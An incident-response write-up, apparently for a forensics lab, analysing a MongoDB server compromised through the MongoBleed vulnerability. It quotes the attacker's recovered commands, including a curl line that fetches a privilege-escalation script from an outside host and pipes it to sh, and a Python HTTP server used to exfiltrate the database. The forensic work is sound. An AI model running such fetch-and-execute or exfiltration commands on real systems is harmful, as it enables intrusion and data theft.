![[25-12-writeup-mangobleed-0.png]]
Nicholas Howland 12/31/25
## Narrative
You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

## Summary
- The attacker discovered the server to be running a vulnerable version of MongoDB after which they began using the publicly available proof of concept code to exploit the server which eventually lead to file exfiltration via a python HTTP server. Once the attacker successfully exploited the server using MangoBleed they were able to gain access to a user account and either discovered or brute forced valid user credentials in order to gain persistence and user level access to the machine. After successfully logging into the server at `2025-12-29 05:40:03` the attacker attempted to escalate privileges through the use of the tool LinPeas. This may have proven unsuccessful or was not able to be acted on due to the integrity of the mongodb.log and auth.log file remaining in tact and no bash history on the root users account. The attacker began exfiltration or fully exfiltrated the mongoDB database using a python http server. If external network logs exist for communications between the server and the attacker on port 6969 the amount of data and what data was compromised can be determined as the server that the attacker used was unencrypted. 
## Questions

What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
- The most recent and severe vulnerability affecting MongoDB is `CVE-2025-14847` This is rated at 8.7 severity with network attack vector meaning that the vulnerability is accessible over the network, with no user access credentials.
- This vulnerability was caused by the improper handling of a length parameter vulnerability in Zlib (CISA, CVE-2025-14847)

What is the version of MongoDB installed on the server that the CVE exploited?
- I first looked in the mongo logs to discover what versions were being used using the following command
```bash
cat ./\[root\]/var/log/mongodb/mongod.log | jq | grep version
      "version": "8.0.16",
      "version": "24.04"
    "namespace": "admin.system.version",
    "namespace": "admin.system.version",
      "version": "8.0.16",
      "version": "24.04"
      "version": "8.0.16",
      "version": "24.04"

```
- To verify the version being used I also looked at the file located in the `/var/lib/dpkg/status` file to determine the version of mongodb when it was last downloaded which confirmed that the version used was `8.0.16`

Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.
- In order to identify the attacker's IP address I used the tool released by Florian Roth a detection engineer at Nextron Systems. The tool is linked in the resources and consists of a single bash script.
- The IP address discovered was `65.0.76.43`
![[25-12-writeup-mangobleed-1.png]]
Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
- The first detected time the attacker attempted to exploit the server was `2025-12-29 05:25:52`

Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.
- In order to discover the actual number of times the attacker interacted with the server consulting the log file was necessary because the tool above only counts the number of times the attacker attempted to attack the server and not the actual interaction count. To determine this I used the following command `cat ./var/log/mongodb/mongod.log | jq .attr.remote | grep 65.0.76.43 | nl | tail -n 1` which produced the following count of connection entries that contained the attackers IP address `75260` 

The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
- The last interaction the attacker had with the machine was at `2025-12-29T05:27:59.315+00:00` based off of the log file. However this does not indicate that was the actual point in time of access to the machine. There is not a lot to go on in the mongodb log that might indicate a successful exploitation/shell. I inspected the users home directory to discover if the attackers commands had been logged in the `.bash_history` file and they had, which indicated that the attacker had logged in via a legitimate process like SSH. When filtering through the logs stored in `/var/log/auth.log` for occurrences of the attackers ip address of `65.0.76.43 ` I found a successful connection attempt at the time of `2025-12-29 05:40:03`

Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
- The attacker downloaded LinPeas to the machine when they gained access to user account `mongoadmin` in an attempt to escalate privileges on the server. This was evidenced by the entry in the `.bash_history` file `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
- After the attacker gained access to the system and attempted to escalate privileges they then changed their working directory to `/var/lib/mongodb/` and began a python webserver to complete exfiltration on port 6969 using the command `python3 -m http.server 6969`. This information was discovered in the  `.bash_history` file. The attacker was interested in this particular directory because it is where the database was stored according to the mongo db configuration.

## References

[CISA, CVE-2025-14847](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-14847)

[NIST CVE](https://nvd.nist.gov/vuln/detail/CVE-2025-14847)

[MongoBleed Detector](https://github.com/Neo23x0/mongobleed-detector)

